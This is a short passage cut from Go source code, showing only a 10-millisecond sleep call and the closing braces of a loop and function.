		time.Sleep(10 * time.Millisecond)
	}
}
